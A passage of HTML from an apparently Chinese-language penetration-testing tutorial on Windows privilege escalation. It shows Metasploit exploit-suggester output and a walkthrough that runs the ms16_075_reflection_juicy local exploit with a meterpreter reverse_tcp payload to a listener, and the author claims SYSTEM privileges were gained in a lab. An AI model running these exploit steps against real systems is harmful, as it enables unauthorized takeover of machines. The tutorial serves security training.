class="token-line" style="color:#393A34"><span class="token plain"> 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 9   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 11  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 12  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 13  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 14  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 15  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 16  exploit/windows/local/bthpan                                   No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 17  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 18  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 19  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 20  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 21  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 22  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 23  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 24  exploit/windows/local/ipass_launch_app                         No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 25  exploit/windows/local/lenovo_systemupdate                      No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 26  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 27  exploit/windows/local/mqac_write                               No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 28  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 29  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 30  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 32  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 33  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 34  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 35  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 36  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 37  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 39  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 41  exploit/windows/local/webexec                                  No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Post module execution completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="执行提权">执行提权<a href="#执行提权" class="hash-link" aria-label="执行提权的直接链接" title="执行提权的直接链接">​</a></h4><p>注意这里我之前的操作都是使用Windows7来提权的，不过演示过程中，发现无法提权，后来到这里的时候切换为Windows2012了，这里需要注意，也间接性表面，提权的困难。</p><p>这里选择上面yes的模块，并进行设置模块，然后设置相关参数，这里仔细看，首先设置session，这个就是之前msf上线的编号，然后后面可以看到我将端口设置为6666，其实这里，有时候会出现命令执行成功了，但是并不能反弹会话窗口，那么这里我就重新设置了一个监听，来监听返回的端口。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 post(multi/recon/local_exploit_suggester)&gt; use exploit/windows/local/ms16_075_reflection_juicy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; options </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Module options (exploit/windows/local/ms16_075_reflection_juicy):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Name     Current Setting                         Required  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ----     ---------------                         --------  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   CLSID    {4991d34b-80a1-4291-83b6-3328366b9097}  yes       Set CLSID value of the DCOM to trigger</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SESSION                                          yes       The session to run this module on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload options (windows/meterpreter/reverse_tcp):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Name      Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ----      ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   EXITFUNC  none             yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   LHOST     192.168.10.20    yes       The listen address (an interface may be specified)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   LPORT     4444             yes       The listen port</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Exploit target:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Id  Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   --  ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0   Automatic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">View the full module info with the info, or info -d command.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set session 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session =&gt; 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set lport 6666</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lport =&gt; 6666</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] Handler failed to bind to 192.168.10.20:6666:-  -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] Handler failed to bind to 0.0.0.0:6666:-  -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Launching notepad to host the exploit...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Process 1404 launched.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Reflectively injecting the exploit DLL into 1404...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Injecting exploit into 1404...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Exploit injected. Injecting exploit configuration into 1404...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Configuration injected. Executing exploit...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Exploit completed, but no session was created.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/8TmHN2l6JBIXvQV.png#alt=image-20230316111033982" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="返回端口">返回端口<a href="#返回端口" class="hash-link" aria-label="返回端口的直接链接" title="返回端口的直接链接">​</a></h4><p>设置监听端口，应该不需要重新演示一边了吧，这里就看效果吧！</p><p>可以看到这里已经成功获取system权限了。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/16/MyVxDRslunBjdIA.png#alt=image-20230316115858577" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/Adm8n/Adm8n.github.io/tree/gh-pages/docs/权限提升/权限提升.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/权限提升/windows 提权——数据库提权"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">windows 提权——数据库提权</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/category/启明星辰溯源工程师"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">启明星辰溯源工程师</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#权限说明" class="table-of-contents__link toc-highlight">权限说明</a></li><li><a href="#权限提升后操作" class="table-of-contents__link toc-highlight">权限提升后操作</a></li><li><a href="#权限提升的意义" class="table-of-contents__link toc-highlight">权限提升的意义</a></li><li><a href="#权限提升整体流程" class="table-of-contents__link toc-highlight">权限提升整体流程</a></li><li><a href="#权限获取方式" class="table-of-contents__link toc-highlight">权限获取方式</a><ul><li><a href="#特殊类型权限获取流程" class="table-of-contents__link toc-highlight">特殊类型权限获取流程</a></li><li><a href="#普通类型权限获取流程" class="table-of-contents__link toc-highlight">普通类型权限获取流程</a></li></ul></li><li><a href="#常见的语言" class="table-of-contents__link toc-highlight">常见的语言</a><ul><li><a href="#jsp权限" class="table-of-contents__link toc-highlight">JSP权限</a></li><li><a href="#php权限" class="table-of-contents__link toc-highlight">PHP权限</a></li><li><a href="#asp权限" class="table-of-contents__link toc-highlight">ASP权限</a></li><li><a href="#aspx权限" class="table-of-contents__link toc-highlight">ASPX权限</a></li></ul></li><li><a href="#权限划分" class="table-of-contents__link toc-highlight">权限划分</a><ul><li><a href="#linux" class="table-of-contents__link toc-highlight">Linux</a></li><li><a href="#windows" class="table-of-contents__link toc-highlight">Windows</a></li></ul></li><li><a href="#注意点" class="table-of-contents__link toc-highlight">注意点</a></li><li><a href="#后台权限提升" class="table-of-contents__link toc-highlight">后台权限提升</a></li><li><a href="#web权限提升" class="table-of-contents__link toc-highlight">web权限提升</a></li><li><a href="#windows提权常见步骤" class="table-of-contents__link toc-highlight">Windows提权常见步骤</a><ul><li><a href="#信息收集" class="table-of-contents__link toc-highlight">信息收集</a></li></ul></li><li><a href="#溢出提权" class="table-of-contents__link toc-highlight">溢出提权</a><ul><li><a href="#溢出提权介绍" class="table-of-contents__link toc-highlight">溢出提权介绍</a></li><li><a href="#溢出提权三种方式" class="table-of-contents__link toc-highlight">溢出提权三种方式</a></li></ul></li><li><a href="#手动溢出提权" class="table-of-contents__link toc-highlight">手动溢出提权</a><ul><li><a href="#上线" class="table-of-contents__link toc-highlight">上线</a></li><li><a href="#信息收集-1" class="table-of-contents__link toc-highlight">信息收集</a></li><li><a href="#寻找exp" class="table-of-contents__link toc-highlight">寻找EXP</a></li><li><a href="#提权exp运行方式" class="table-of-contents__link toc-highlight">提权EXP运行方式</a></li></ul></li><li><a href="#cs半自动化溢出提权" class="table-of-contents__link toc-highlight">CS半自动化溢出提权</a><ul><li><a href="#上线-1" class="table-of-contents__link toc-highlight">上线</a></li><li><a href="#提权插件" class="table-of-contents__link toc-highlight">提权插件</a></li><li><a href="#当前权限" class="table-of-contents__link toc-highlight">当前权限</a></li><li><a href="#提权操作" class="table-of-contents__link toc-highlight">提权操作</a></li></ul></li><li><a href="#msf全自动溢出提权" class="table-of-contents__link toc-highlight">MSF全自动溢出提权</a><ul><li><a href="#监听操作" class="table-of-contents__link toc-highlight">监听操作</a></li><li><a href="#半自动化提权操作" class="table-of-contents__link toc-highlight">半自动化提权操作</a></li><li><a href="#全自动化提权操作" class="table-of-contents__link toc-highlight">全自动化提权操作</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/Adm8n/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 Adm8n, Inc.</div></div></div></footer></div>
<script src="/assets/js/runtime~main.41533b7a.js"></script>
<script src="/assets/js/main.103d9737.js"></script>
</body>
</html>